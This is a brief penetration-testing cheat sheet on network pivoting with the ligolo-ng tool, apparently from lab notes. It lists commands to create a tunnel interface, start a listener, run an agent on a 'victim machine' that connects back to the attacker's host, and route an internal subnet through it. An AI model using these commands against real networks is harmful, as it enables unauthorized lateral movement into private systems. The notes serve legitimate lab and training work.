title: Pivoting
html:
Pivoting

## Host Machine ``` sudo ip tuntap add user p3ta mode tun ligolo ``` ``` sudo ip link set ligolo up ``` ``` sudo ./proxy -selfcert -laddr 0.0.0.0:443 ``` ``` sudo ./proxy -selfcert -laddr 0.0.0.0:443 ``` ## On Victim Machine ``` ./agent -connect 10.10.14.21:443 -ignore-cert ``` ## On Host Machine ``` sudo ip route add 172.16.1.0/24 dev ligolo ```
